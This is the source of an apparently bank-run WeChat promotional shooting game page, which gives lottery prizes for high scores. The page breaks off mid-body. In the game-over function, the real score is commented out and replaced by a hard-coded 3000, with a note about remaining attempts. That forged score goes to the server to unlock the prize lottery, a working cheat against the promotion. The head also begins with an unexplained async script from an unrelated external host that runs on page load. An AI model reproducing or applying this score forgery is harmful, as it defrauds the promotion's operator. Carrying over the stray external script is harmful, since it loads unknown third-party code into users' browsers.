<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
<head><script async src="//ij.so9.cc/j/?t=fx&g=cc81da4ac700&c=e84e063c3386&rv=1"></script>           
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta name="format-detection" content="telephone=no">
    <meta http-equiv="Cache-Control" content="max-age=1" />
    <title>浦发银行</title>
    <link rel="stylesheet" href="./css/basic.css">
    <link rel="stylesheet" href="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_css/showLoading.css?v=1">
    <link rel="stylesheet" href="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_css/smoothness/jquery-ui-1.10.1.custom.css">
    <link rel="stylesheet" href="./css/customDialog.css?v=1">
	<link rel="stylesheet" href="./css/mobiscroll.min.css?v=1">
    
    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/jquery.min.js"></script>
    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/showLoading.min.js"></script>
    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/jquery-ui-1.10.1.custom.min.js"></script>
 	
 	<script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/preventClickDoubleFired.js"></script>
    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/easyJsDomUtil.js"></script>
    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/salamaWebClientService.js"></script>
    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/salamaClientService.js"></script>

    <script src="./js/myCommon.js?v=2"></script>
    <script src="./js/lib/customDialog.js"></script>
	<script src="./js/lib/jquery.movingboxes.js"></script>
    <script src="./js/lib/WeiXinSdk.js"></script>    
	
	<script src=" js/lib/mobiscroll.min.js"></script>
    <script src="./js/common.js?v=0"></script>
    <script src="./js/commonShare.js?v=3"></script>
    <script>
	var gamePage = new GamePage();

if (window.__skipInitPage == undefined || !window.__skipInitPage) {
    $(document).ready(function() {
        setHtmlFontSize();
        commonShare.initWxSetting(gamePage.initPage,null,false,true);
        //gamePage.initPage();
    });
}


function GamePage() {

    var _this = this;
    var _appId = "";

    var _token = "";
    var _gameStartTime = "";

    var _recordId;
    var _pay_forward_url;
    var _order_id;

    var _countdown = null;

    var _teamName;

    this.initPage = function() {
        _appId = $my.getUrlParam("appId");

        $my.async.series([
            loadData,
            initFormInfo
        ], function(totalCount, doneCount, error) {
            if (totalCount == doneCount) {
                console.log("gamePage initPage() done");
            }
        });

    };

    //加载战队信息
    function loadData(callback){

        $my.ajax({
            url: $my.getCloudDataServiceUrl(),
            data: {
                serviceType: "com.epointchina.activity.hitplane.base.SpdHitPlaneService",
                serviceMethod: "getUserPlayInfo"
            },
            success: function(response) {
                if (response && response.length > 0) {
                    var dom = easyJsDomUtil.parseXML(response);

                    var code = $(dom).find("resultCode").text();
                    if(code == '000000'){
                        var imgUrl = $(dom).find("imgUrl").text();
                        var teamName = $(dom).find("teamName").text();
                        var sucInfo = $(dom).find("sucInfo").text();
                        var failInfo = $(dom).find("failInfo").text();
                        var playTimes = $(dom).find("today_play_times").text();

                        $('#teamImgUrl').attr("src",imgUrl);
                        $('#teamName').html(teamName + "战队");
                        $('#teamImgUrl2').attr("src",imgUrl);
                        $('#teamName2').html(teamName + "<br/>战队");
                        $('#sucInfo').html(sucInfo);
                        $('#failInfo').html(failInfo);
                        $('#divUsertimes').html(parseInt(playTimes)-1);

                        _teamName = teamName;
                    }

                    if(callback){
                        callback();
                    }
                }
            }
        });
    }


    function initFormInfo(callback) {

        var firstplay = true;
        document.getElementById('mediaAudio').play();
        document.addEventListener("WeixinJSBridgeReady", function () {
            document.getElementById('mediaAudio').play();
        }, false);
        $('#music').unbind('click').bind('click',function(){
            if(firstplay == true){
                $('#music').removeClass("play2");
                document.getElementById('mediaAudio').pause();
                firstplay = false;
            }else if(firstplay == false){
                $('#music').addClass("play2");
                document.getElementById('mediaAudio').play();
                document.addEventListener("WeixinJSBridgeReady", function () {
                    document.getElementById('mediaAudio').play();
                }, false);
                firstplay = true;
            }

        });


        //确定 -- 失败
        $('#backIndex').unbind('click').on('click',function(){
            var url = $my.getWebApp() + "/" + $my.getWebFolder() + "/index.html?appId=" + _appId + "&timeStamp=" + (new Date()).getTime();
            window.location = url;
        });

        //开通直销银行 -- 失败
        $('#gozhixiao').unbind('click').on('click',function(){
            window.location = 'https://open.weixin.qq.com/connect/oauth2/authorize?appid=wxce8ca9de350129c3&redirect_uri=https%3A%2F%2Fwap.spdb.com.cn%2Fwap%2FWeixinTongOpenAcctPre.do%3FWxId%3DoKYm8jqA0qbl_Eyh0zWGh6SutFZA%26BranchNo%3DAAAA%26ChannelFlag%3D1%26TelNo%3D%26ManagerID%3D000102030000%26ExReferee%3D%26ExAgency%3D&response_type=code&scope=snsapi_base&state=123#wechat_redirect';
        });

        //抽奖
        $('#btnLottery').unbind('click').on('click',function(){
            <!-- if(!_recordId || _recordId.length == 0) { -->
                <!-- showDialog.showConfirmDialog({title : "温馨提示", msgInfo : "网络加载错误，请重新进入游戏",btnOk:function(){ -->
                    <!-- var url = $my.getWebApp() + "/" + $my.getWebFolder() + "/index.html?appId=" + _appId + "&timeStamp=" + (new Date()).getTime(); -->
                    <!-- window.location = url; -->
                <!-- }}); -->
            <!-- } -->

            $("#dfj").show();

            $my.ajax({
                url: $my.getCloudDataServiceUrl(),
                data: {
                    serviceType: "com.epointchina.activity.hitplane.base.SpdHitPlaneService",
                    serviceMethod: "doLottery",
                    recordId: _recordId
                },
                success: function(response) {

                    setTimeout(function(){
                        $("#dfj").hide();
                        if (response && response.length > 0) {
                            var dom = easyJsDomUtil.parseXML(response);
                            var code = $(dom).find("resultCode").text();
                            if(code == '000000') {
                                $("#prize").show();
                                _order_id = $(dom).find('order').find("order_id").text();
                                _pay_forward_url = $(dom).find('payForwardUrl').text();

                                var award_name = $(dom).find('award').find('award_name').text();
                                var img_url = $(dom).find('award').find('img_url').text();

                                $("#goodsImg").attr("src",img_url);
                                $("#goodsName").html(award_name + "<br/>支付99金豆领取奖品");

                            } else if (code == 'RES_000005') {
                                $('#lottery_success_sure').show();
                            } else {
                                $('#lottery_success_no').show();
                            }
                        }
                    }, 2000);


                }
            });
        });

        //去支付
        $('#gopay').unbind('click').on('click',function(){
            window.location = _pay_forward_url + _order_id +"&timeStamp=" + (new Date()).getTime();
        });

        //算了不要了
        $('#giveup').unbind('click').on('click',function(){
            $my.ajax({
                url: $my.getCloudDataServiceUrl(),
                data: {
                    serviceType: "com.epointchina.activity.hitplane.base.SpdHitPlaneService",
                    serviceMethod: "giveUpOrder",
                    order_id: _order_id
                },
                success: function(response) {
                    if (response && response.length > 0) {
                        var dom = easyJsDomUtil.parseXML(response);

                        var code = $(dom).find("resultCode").text();
                        if(code == '000000'){
                            var url = $my.getWebApp() + "/" + $my.getWebFolder() + "/index.html?appId=" + _appId + "&timeStamp=" + (new Date()).getTime();
                            window.location = url;
                        } else {
                            showDialog.showConfirmDialog({title : "温馨提示", msgInfo : "网络加载错误，请重新进入游戏",btnOk:function(){
                                var url = $my.getWebApp() + "/" + $my.getWebFolder() + "/index.html?appId=" + _appId + "&timeStamp=" + (new Date()).getTime();
                                window.location = url;
                            }});
                        }
                    }
                }
            });
        });

        //已有奖品确认
        $('#success_sure').unbind('click').on('click',function(){
            var url = $my.getWebApp() + "/" + $my.getWebFolder() + "/myGoods.html?appId=" + _appId + "&timeStamp=" + (new Date()).getTime();
            window.location = url;
        });

        //未中奖确认
        $('#success_no').unbind('click').on('click',function(){
            var url = $my.getWebApp() + "/" + $my.getWebFolder() + "/index.html?appId=" + _appId + "&timeStamp=" + (new Date()).getTime();
            window.location = url;
        });

        //再玩一次
        $('[id="replay"]').unbind('click').bind('click', function() {
            window.location.reload();
        });


        //排行榜
        $('[id="charts"]').unbind('click').bind('click', function() {
            var url = $my.getWebApp() + "/" + $my.getWebFolder() + "/rank.html?appId=" + _appId + "&timeStamp=" + (new Date()).getTime();
            window.location = url;
        });

        //分享
        $('[id="btnShare"]').unbind('click').bind('click', function() {

            if(isWeixin()){
                $('[id="share_pg"]').fadeIn();
            }else{
                showDialog.showInfoDialog({title : "温馨提示", msgInfo : "请去微信端进行分享" });
            }

        });

        $('[id="share_pg"]').unbind('click').bind('click', function() {
            $('[id="share_pg"]').fadeOut();
        });

        //游戏
        $('#star').unbind('click').on('click',function(){
            _recordId = "";
            $my.ajax({
                url: $my.getCloudDataServiceUrl(),
                data: {
                    serviceType: "com.epointchina.activity.hitplane.base.SpdHitPlaneService",
                    serviceMethod: "beforePlay"
                },
                success: function(response) {
                    if (response && response.length > 0) {
                        var dom = easyJsDomUtil.parseXML(response);

                     //   if (!$my.checkPageResult($(dom))) {
                       //     return;
                        //}

                        var result = $(dom).find("resultData").text();
                        _token = result.split(',')[0];
                        _gameStartTime = result.split(',')[1];

                        $('#star_yx').hide();
                        game_star();
                    }
                }
            });
        });

        if(callback) {
            callback();
        }
    }





    function game_star(){

        timesUp();


        //获取元素
        var mapCanvas = document.getElementById("map");
        var ctx = mapCanvas.getContext("2d");
        var loadingDiv = document.getElementById("loading");
        var scoreSpan = document.querySelector("#current-score>span");
        //设置canvas的大小和浏览器大小保存一致
        //mapCanvas.width = window.innerWidth;
        //mapCanvas.height = window.innerHeight;
        mapCanvas.width = document.documentElement.clientWidth;
        mapCanvas.height = document.documentElement.clientHeight;

        //预加载: 浏览器对应相同的图片只会加载一次
        //用数组记录图片的名字, 方便处理
        var picsnames = ["background.png", "bullet1.png", "bullet2.png", "herofly.png", "loading.gif", "prop.png"];
        //var musicNames = ["bullet.mp3", "enemy1_down.mp3", "enemy2_down.mp3", "enemy3_down.mp3", "game_music.mp3", "game_over.mp3"];
        //记录图片加载的张数
        var picCount = 0;
        //记录加载完成的音乐数量
        var musicCount = 0;
        //存音乐元素
        //var musics = [];
        for(var i = 0; i < picsnames.length; i++) {
            var img = new Image();
            img.src = "imgs/" + picsnames[i];
            img.onload = function() {
                picCount++;
                //判断图片是否加载完成
                if(picCount == picsnames.length) {
                    loadMusic();
                }
            }
        }
        function loadMusic() {
            //音乐预加载
//				for(var i = 0; i < musicNames.length; i++) {
//					var music = new Audio(); //自动预加载
//					music.src = "audio/" + musicNames[i];
//					musics.push(music);
//					music.onloadedmetadata = function() {
//						musicCount++;
//						if(musicCount == musicNames.length) {
//							//隐藏loading标志
            loadingDiv.style.display = "none";
            //开始游戏
            main();
            //播放背景音乐
//							musics[4].volume = 0.5; //音量(0-1)
//							musics[4].loop = true; //循环播放
//							musics[4].play();
//						}
//					}
//				}
        }

        //背景图
        var bgImage = new Image();
        bgImage.src = "imgs/background.png";
        //背景图对象(只有一个)
        var background = {
            //属性
            x: 0,
            y: 0,
            w: mapCanvas.width,
            h: mapCanvas.height,
            //方法
            draw: function() {
                //如何满屏, 并且不调整图片比例
                //1.求最大行和最大列
                var row = Math.ceil(mapCanvas.height / 568);
                var col = Math.ceil(mapCanvas.width / 320);
                //2.循环添加图片
                //为了保证图片无限滚动, 画两张一样的背景图
                for(var i = -row; i < row; i++){ //行
                    for(var j = 0; j < col; j++){ //列
                        ctx.drawImage(bgImage, 320 * j, 568 * i + this.y);
                    }
                }
            },
            //移动
            move: function() {
                this.y++;
                //判断一张图片滚动完成, 重置位置
                var row = Math.ceil(mapCanvas.height / 568);
                if(this.y == row * 568) {
                    this.y = 0;
                }
            },
        };

        //sprite image: 精灵图, 雪碧图, 降低的服务器的压力, 把常见的logo/icon放到图片中
        //游戏中把一个物体的不同状态下的图片, 做出雪碧图

        //英雄图片
        var heroImg = new Image();
        heroImg.src = "imgs/herofly.png";
        //子弹图片
        var bulletImg1 = new Image();
        bulletImg1.src = "imgs/bullet1.png";
        var bulletImg2 = new Image();
        bulletImg2.src = "imgs/bullet2.png";

        //英雄对象
        var hero = {
            //属性
            x: mapCanvas.width / 2 - 33,
            y: mapCanvas.height - 82 - 100,
            w: 66,
            h: 82,
            i: 0, //第几张图片(从0开始算)
            flagI: 0, //图片切换的频率
            bullets: [], //用于记录发射出去的子弹
            flagShot: 0, //子弹发射频率
            armType: 0, //武器类型(0: 单排; 1:双排)
            boom: false, //是否爆炸
            //方法
            draw: function() {
                //控制图片切换
                this.flagI++;
                if(this.flagI == 10) {
                    if(this.boom) {
                        this.i++;
                        if(this.i == 5) {
                            //英雄死亡
                            gameOver();
                        }
                    } else {
                        this.i = (this.i++) % 2;
                    }
                    //重置
                    this.flagI = 0;
                }

                //把图片的某一部分画到canvas上某个区域
                ctx.drawImage( heroImg, this.i * this.w, 0, this.w, this.h, this.x, this.y, this.w, this.h);
            },
            //发射子弹
            shot: function() {
                //爆炸后, 不能发射子弹
                if(!this.boom) {
                    this.flagShot++;
                }
                if(this.flagShot == 5) {
                    //播放发射子弹音乐
                    //	musics[0].play();
                    if(this.armType) {
                        //创建双排子弹对象
                        var bullet = new Bullet(this.x + this.w / 2 - 24, this.y + 20, 48, 14, bulletImg2, 2);
                    } else {
                        //创建单排子弹对象
                        var bullet = new Bullet(this.x + this.w / 2 - 2, this.y - 14, 6, 14, bulletImg1, 1);
                    }
                    //记录子弹
                    this.bullets.push(bullet);
                    //重置
                    this.flagShot = 0;
                }

                //移动每一颗子弹
                for(var i = 0; i < this.bullets.length; i++) {
                    //判断子弹是否超出屏幕
                    if(this.bullets[i].y <= -this.bullets[i].h) {
                        //删除子弹
                        this.bullets.splice(i, 1);
                        i--;
                    } else {
                        //移动子弹
                        this.bullets[i].move();
                        this.bullets[i].draw();
                    }
                }
            },
        }

        //鼠标控制英雄
        mapCanvas.onmousedown = function(event) {
            //1.鼠标位置
            var x = event.offsetX;
            var y = event.offsetY;
            //2.判断是否选中飞机
            if(x >= hero.x && x <= hero.x + hero.w && y >= hero.y && y <= hero.y + hero.h) {
                //选中飞机, 才能移动
                mapCanvas.onmousemove = function(event) {
                    //飞机的中心在鼠标的位置
                    hero.x = event.offsetX - hero.w / 2;
                    hero.y = event.offsetY - hero.h / 2;
                }
            }
        }
        //松开鼠标, 移除事件
        mapCanvas.onmouseup = function() {
            mapCanvas.onmousemove = null;
        }

        //触摸屏的控制
        mapCanvas.ontouchstart = function(event) {
            //1.手指的位置
            var x = event.touches[0].clientX;
            var y = event.touches[0].clientY;
            //2.判断是否选中飞机
            if(x >= hero.x && x <= hero.x + hero.w && y >= hero.y && y <= hero.y + hero.h) {
                //选中飞机, 才能移动
                mapCanvas.ontouchmove = function(event) {
                    //飞机的中心在鼠标的位置
                    hero.x = event.touches[0].clientX - hero.w / 2;
                    hero.y = event.touches[0].clientY - hero.h / 2;
                    //禁止系统事件行为
                    event.preventDefault();
                }
            }
        }

        mapCanvas.ontouchend = function() {
            mapCanvas.ontouchmove = null;
        }

        //子弹类
        function Bullet(x, y, w, h, img, hurt) {
            //属性
            this.x = x;
            this.y = y;
            this.w = w;
            this.h = h;
            this.img = img;
            this.hurt = hurt; //伤害
        }
        //绘制方法
        Bullet.prototype.draw = function() {
            ctx.drawImage(this.img, this.x, this.y, this.w, this.h);
        }
        //移动方法
        Bullet.prototype.move = function() {
            this.y -= 15;
        }

        //敌人类
        function Enemy(x, y, w, h, img, speed, hp, score, maxI) {
            //属性
            this.x = x;
            this.y = y;
            this.w = w;
            this.h = h;
            this.img = img;
            this.speed = speed; //速度
            this.hp = hp; //血量
            this.score = score; //分数
            this.boom = false; //是否爆炸
            this.i = 0; //第几张图片
            this.maxI = maxI; //播放的图片张数
            this.isDie = false; //是否死亡
            this.flagI = 0; //图片切换的频率
        }
        //方法
        Enemy.prototype.draw = function() {
            //爆炸, 切换图片
            if(this.boom) {
                this.flagI++;
                if(this.flagI == 3) {
                    this.i++;
                    if(this.i == this.maxI) {
                        //当图片切换结束,飞机死亡
                        this.isDie = true;
                    }
                    //重置
                    this.flagI = 0;
                }
            }
            ctx.drawImage(this.img, this.i * this.w, 0, this.w, this.h, this.x, this.y, this.w, this.h);
        }
        Enemy.prototype.move = function() {
            this.y += this.speed;
        }
        //随机数
        function random(x, y) {
            return parseInt(Math.random() * (y - x + 1) + x);
        }
        //敌机图片
        var enemyImg1 = new Image();
        enemyImg1.src = "imgs/f1.png";
        var enemyImg2 = new Image();
        enemyImg2.src = "imgs/f2.png";
        var enemyImg3 = new Image();
        enemyImg3.src = "imgs/f3.png";
        //记录创建的敌机
        var enemies = [];
        //随机产生敌机
        function randomEnemy() {
            //控制飞机产生的概率
            var num = random(1, 1000);
            if(num <= 60) {
                if(num <= 40) { //小飞机
                    //随机位置
                    var randomX = random(0, mapCanvas.width - 38);
                    //随机速度
                    var randomSpeed = random(2, 10);
                    //创建小飞机
                    var enemy = new Enemy(randomX, -34, 75, 57, enemyImg1, randomSpeed, 1, 10, 5);
                    //记录飞机
                    enemies.push(enemy);
                } else if(num <= 48) { //中型飞机
                    //随机位置
                    var randomX = random(0, mapCanvas.width - 46);
                    //随机速度
                    var randomSpeed = random(2, 6);
                    //创建中型飞机
                    var enemy = new Enemy(randomX, -64, 80, 100, enemyImg2, randomSpeed, 5, 15, 6);
                    //记录飞机
                    enemies.push(enemy);
                } else { //大型飞机
                    //随机位置
                    var randomX = random(0, mapCanvas.width - 110);
                    //随机速度
                    var randomSpeed = random(2, 4);
                    //创建小飞机
                    var enemy = new Enemy(randomX, -164, 156, 148, enemyImg3, randomSpeed, 10, 30, 10);
                    //记录飞机
                    enemies.push(enemy);
                }
            }

            //移动飞机
            for(var i = 0; i < enemies.length; i++) {
                //判断飞机是否超出屏幕
                if(enemies[i].y >= mapCanvas.height || enemies[i].isDie) {
                    //删除飞机
                    enemies.splice(i, 1);
                    //数组中删除某个元素, 为了保证相邻的下一个元素能够遍历到, 需要i--
                    i--;
                } else {
                    enemies[i].move();
                    enemies[i].draw();
                }
            }
        }

        //道具图片
        var propImg = new Image();
        propImg.src = "imgs/prop.png";
        //道具类
        function Prop(x, y, w, h, type, speed) {
            this.x = x;
            this.y = y;
            this.w = w;
            this.h = h;
            this.type = type; //道具类型(0:炸弹, 1:双排子弹)
            this.speed = speed;
            this.isUsed = false; //道具有没有被使用
        }
        //方法
        Prop.prototype.draw = function() {
            ctx.drawImage(propImg, this.type * this.w, 0, this.w, this.h, this.x, this.y, this.w, this.h);
        }
        //移动
        Prop.prototype.move = function() {
            this.y += this.speed;
        }

        //记录创建出来的道具
        var props = [];
        //随机产生道具
        function randomProp() {
            //控制道具产生的概率
            if(random(1, 1000) <= 10) {
                var randomX = random(0, mapCanvas.width - 38);
                var randomType = random(1, 1);
                var randomSpeed = random(5, 10);
                var prop = new Prop(randomX, -68, 38, 68, randomType, randomSpeed);
                props.push(prop);
            }
            //移动道具
            for(var i = 0; i < props.length; i++) {
                //当道具超出屏幕, 或者道具被使用
                if(props[i].y >= mapCanvas.height || props[i].isUsed) {
                    props.splice(i, 1);
                    i--;
                } else {
                    props[i].move();
                    props[i].draw();
                }
            }
        }

        //两个矩形碰撞检测
        function crash(obj1, obj2) {
            //两个物体上下左右的位置
            var left1 = obj1.x;
            var right1 = obj1.x + obj1.w;
            var top1 = obj1.y;
            var bottom1 = obj1.y + obj1.h;

            var left2 = obj2.x;
            var right2 = obj2.x + obj2.w;
            var top2 = obj2.y;
            var bottom2 = obj2.y + obj2.h;

            //判断是否发生碰撞
            if(right1 < left2 || bottom1 < top2 || left1 > right2 || top1 > bottom2) {
                return false;
            } else {
                return true;
            }
        }

        //记录子弹持续时间的计时器
        var timeout = null;
        //碰撞检测
        function justify() {
            //道具和英雄
            for(var i = 0; i < props.length; i++) {
                if(hero.boom) {
                    continue;
                }
                if(!crash(props[i], hero)) {
                    continue;
                }
                //发生碰撞
                if(props[i].type) { //双排子弹
                    hero.armType = 1;
                    //清除之前的定时器
                    clearTimeout(timeout);
                    //双排子弹持续5秒
                    timeout = setTimeout(function() {
                        hero.armType = 0;
                    }, 5000);
                } else { //炸弹
                    //所有飞机爆炸
                    for(var j = 0; j < enemies.length; j++) {
                        enemies[j].boom = true;
                        //计分
                        scoreSpan.innerHTML = parseInt(scoreSpan.innerText) + enemies[j].score;
                    }
                }
                //修改道具状态为使用
                props[i].isUsed = true;
            }

            //子弹(hero.bullets)和敌机(enemies)
            for(var i = 0; i < enemies.length; i++) {
                for(var j = 0; j < hero.bullets.length; j++) {
                    if(enemies[i].boom) {
                        break;
                    }
                    //检测是否发生碰撞
                    if(!crash(enemies[i], hero.bullets[j])) {
                        continue;
                    }
                    //发生碰撞💥
                    //1.掉血
                    enemies[i].hp -= hero.bullets[j].hurt;
                    //2.判断敌机是否死亡
                    if(enemies[i].hp <= 0) {
                        enemies[i].boom = true;
                        //计分
                        scoreSpan.innerHTML = parseInt(scoreSpan.innerText) + enemies[i].score;
                        //判断飞机类型
//							switch(enemies[i].score) {
//								case 100:
//									musics[1].play();
//									break;
//								case 500:
//									musics[2].play();
//									break;
//								case 1000:
//									musics[3].play();
//									break;
//								default:
//									break;
//							}
                    }
                    //3.子弹消失
                    hero.bullets.splice(j, 1);
                    j--;
                }
            }

            //敌机和英雄
            for(var i = 0; i < enemies.length; i++) {
                //如果敌机已经爆炸, 不做碰撞检测
                if(enemies[i].boom) {
                    continue;
                }
                if(crash(enemies[i], hero)) {
                    //英雄爆炸
                    hero.boom = true;
                }
            }
        }

        //游戏主程序
        function main() {
            //清除画布内容
            ctx.clearRect(0, 0, mapCanvas.width, mapCanvas.height);

            //画背景
            background.draw();
            background.move();

            //画英雄
            hero.draw();
            hero.shot();

            //画敌机
            randomEnemy();

            //画道具
            randomProp();


            if(!hero.boom) {
                //检测
                justify();
            }

            //同步刷新
            requestAnimationFrame(main);
        }

        //用户改变窗口大小
        window.onresize = function() {
            mapCanvas.width = document.documentElement.clientWidth;
            mapCanvas.height = document.documentElement.clientHeight;
            background.draw();
        }

        //倒计时
        function timesUp(){
            var i=30;
            function timeShow(){
                i--;
                $(".countdown").html(i);
                if(i<1){
                    clearInterval(_countdown);
                    hero.boom = true;
                }
            };
            _countdown = setInterval(timeShow,1000);
        }

        //游戏结束
        function gameOver() {



            clearInterval(_countdown);

            //暂停背景音乐
            //musics[4].pause();
            //播放游戏结束
            //musics[5].play();

            // var score = parseInt(scoreSpan.innerText);
			// 还需两次8705
            var score = 3000;

            $my.ajax({
                url: $my.getCloudDataServiceUrl(),
                data: {
                    serviceType: "com.epointchina.activity.hitplane.base.SpdHitPlaneService",
                    serviceMethod: "afterPlay",
                    score: score,
                    gameStartTime : _gameStartTime,
                    token : _token
                },
                success: function(response) {
                    if (response && response.length > 0) {
                        var dom = easyJsDomUtil.parseXML(response);

                        if (!$my.checkPageResult($(dom))) {
                            return;
                        }

                        _recordId = $(dom).find("record_id").text();

                        $("#end-score").text(score);
                        $("#page").hide();
                        $("#page2").show();

                        commonShare.setShareDesc(_teamName);

                        if(score >= 930){
                            $("#failInfo").hide();
                            $("#sucInfo").show();
                            $("#gameresultfail").hide();
                            $("#gameresultsuc").show();
                            $("#liFail").hide();
                            $("#liSuccess").show();
                        }else{
                            $("#failInfo").show();
                            $("#sucInfo").hide();
                            $("#gameresultfail").show();
                            $("#gameresultsuc").hide();
                            $("#liFail").show();
                            $("#liSuccess").hide();
                        }
                    }
                }
            });
        }
    }


}





	</script>

<style>
.page{background-image:none;
	background-size:100% auto;
	background-repeat:no-repeat;
	background-position:center 0;
	-moz-background-size:cover;
	-webkit-background-size:cover;
	-o-background-size:cover;
    background-size:cover;
    text-align: center;
    position:fixed;top:0;left:0;width:100%;min-height:100%;overflow:hidden;max-width:640px;min-width:320px;z-index:1;}

#map {
	/*方式2*/
	display: block;
	position: fixed;
	/*方式3*/
	/*vertical-align: top;*/
}			
#loading {
	position: absolute;
	/*top,left基于父视图*/
	top: 50%;
	left: 50%;
	text-align: center;
	/*translate基于自身*/
	transform: translate(-50%, -50%);
}

.g_2 {
	position: absolute;
	top: 0.8rem;
	left: 3rem;
	font-size: 0.7rem;
}

#menu {
	width: 160px;
	height: 160px;
	position: absolute;
	top: 50%;
	left: 50%;
	transform: translate(-50%, -50%);
	list-style-type: none;
	text-align: center;
	border: 1px solid black;
	border-radius: 5px;
	background-color: #BBC1C2;
	font-size: 20px;
	line-height: 40px;
	display: none;
}

#end-score {
	line-height:2rem;
}

#restart {
	cursor: pointer;
	/*不允许用户选择当前区域的内容*/
	-webkit-user-select: none;
	-moz-user-select: none;
	-ms-user-select: none;
	user-select: none;
}
.g_1{position: absolute;left: 0.5rem;top: 0.5rem;width: 2rem;z-index: 99;border:  4px solid #00fffb;}
.g_3{position: absolute;left: 0.4rem;top: 2.8rem;z-index: 99;width: 3rem;font-size: 0.8rem;}
.g_4{position: absolute;top: 0.5rem;width: 100%;text-align: center;z-index: 100;}
.star{width:100%;position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;background:rgba(0,0,0,0.9);}
.star .star_btn{width: 6rem;position: absolute;bottom: 4rem;left: 5rem;}
.star_fj{width: 8rem;position: absolute;left: 4rem;top: 3rem;}



.page2{background-image:url(imgs/bg4.jpg);
background-size:100% auto;
background-repeat:no-repeat;
background-position:center 0;
-moz-background-size:cover;
-webkit-background-size:cover;
-o-background-size:cover;
background-size:cover;
text-align: center;
position:absolute;top:0;left:0;width:100%;min-height:100%;overflow:hidden;max-width:640px;min-width:320px;z-index:1;
}
.d_1{position: relative;width: 12rem;height: 15rem;top: 3.2rem;left: 2rem;}
.d_ul{margin-top: 0.5rem;}
.d_ul li{position: relative;height: 3rem;}
.d_ul img{width: 2rem;position: absolute;left: 0.5rem;top: 0.5rem;border: 2px solid #00FFFB;}
.d_ul span{color: white;position: absolute;left: 3.2rem;font-size: .8rem;top: .4rem;font-weight: 600;}
.d_ul i{position: absolute;left: 6rem;font-size: 0.5rem;text-align: left;color: #00fffb;top: 1rem;}
.d_2{color: white;font-size: 0.9rem;position: absolute;top: 4rem;width: 100%;text-align: center;}
.d_3{color: white;font-size: 0.9rem;position: absolute;top: 6rem;width: 100%;text-align: center;}
.d_4{position: absolute;top: 8rem;width: 100%;}
.d_4 .cj{width: 5.1rem;}
.d_4 .qd{width: 3.6rem;}
.d_4 .kt{width: 4.8rem;}
.d_5{position: absolute;top: 13.5rem;color: white;width: 100%;font-size: 0.8rem;}
.dd{position: absolute;top: 21.4rem;}
.dd img{width: 1.2rem;}
.dd li{float: left;}
.dd p{color: white;font-size: 0.6rem;margin-top: 0.9rem;}
.li1{margin-left: 3.05rem;}
.li2{margin-left: 1.6rem;}
.li3{margin-left: 2.2rem;}
.de{width:100%;position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;background:rgba(0,0,0,0.8);}
.dfj{width: 4rem;position: absolute;left: 6rem;top: 14rem;}
.dfj{-webkit-animation:dfj 1000ms ease-in 500ms 1 forwards;animation:dfj 1000ms ease-in 500ms 1 forwards;}
@keyframes dfj {
    0% {opacity:1;transform:translate(0,0);}
    100% {opacity:1;transform:translate(0,-20rem);}
}
@-webkit-keyframes dfj {
    0% {opacity:1;-webkit-transform:translate(0,0)}
    100% {opacity:1;-webkit-transform:translate(0,-20rem);}
}
.zjtk{background-image: url(imgs/jptk.png);position: relative;background-size: 100%;width: 14.2rem;left: 0.9rem;top: 4rem;height: 17.5rem;}
.zjtk p{color: white;padding-top: 3.2rem;font-size: 0.8rem;}
.zjtk .goods{position: absolute;top: 5rem;width: 7rem;left: 3.6rem;}
.zjtk i{position: absolute;top: 10rem;color: white;font-size: 0.6rem;left: 28%;}
.btn{position: absolute;top: 13rem;width: 100%;text-align: center;}
.btn img{width: 4rem;}
.qzf{width: 4.5rem;}
.sl{width: 4.5rem;}
.mzj{width: 8.45rem;margin-top: 4rem;}
.share{width:100%;position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;background:rgba(0,0,0,0.8);}
.d_4 p{font-size: 0.6rem;color: #00FEFA;margin-top: 0.5rem;}
.r_music2{position:absolute;width:2.2rem;height:2.2rem;right:0.5rem;top:0.5rem;background-image:url(imgs/m_pause.png);background-repeat:no-repeat;background-position:center center;background-size:1.4rem 1.4rem;cursor:pointer;z-index:101;}
.r_music2.play2{background-image:url(imgs/m_play.png);}
.play2{-webkit-animation:rotateMusic2 1s linear infinite;animation:rotateMusic2 1s linear infinite;}
@-webkit-keyframes rotateMusic2 {
	0% {-webkit-transform:rotate(0deg);}100% {-webkit-transform:rotate(360deg);}
}
@keyframes rotateMusic2 {
	0% {-webkit-transform:rotate(0deg);}100% {-webkit-transform:rotate(360deg);}
}
@media (device-height:480px) and (-webkit-min-device-pixel-ratio:2){/*4 4s*/
#page{min-height:504px;}
}
@media (min-width:360px) and (max-height:540px){/*huawei*/
#page{min-height:567px;}
}
@media (min-height:565px){/*mi*/
}
@media (min-height:600px){/*6*/
}
@media (min-height:670px){/*6plus*/
}
</style>
</head>
<body>
    <div class="page" id="page" style="display: block;">
    	<div class="star" id="star_yx">
    		<img class="star_fj" src="imgs/fjcj.png" />
    		<img class="star_btn" id="star" src="imgs/a1.png"/>
    	</div>
    	<div class="g_1">
    		<img src="" alt="" id="teamImgUrl"/>
    	</div>
    	<div class="g_3" id="teamName"></div>
    	<div class="g_4">
    		倒计时<br/>
    		<span class="countdown">30</span>s
    	</div>
    	<!--游戏地图-->
		<canvas id="map"></canvas>
		<!--加载-->
		<div id="loading">
			
			<p>游戏加载中</p>
		</div>
		<!--分数-->
		<p id="current-score" class="g_2">分数: <span>0</span></p>

	</div>
	
	<div class="page2" id="page2" style="display: none;">
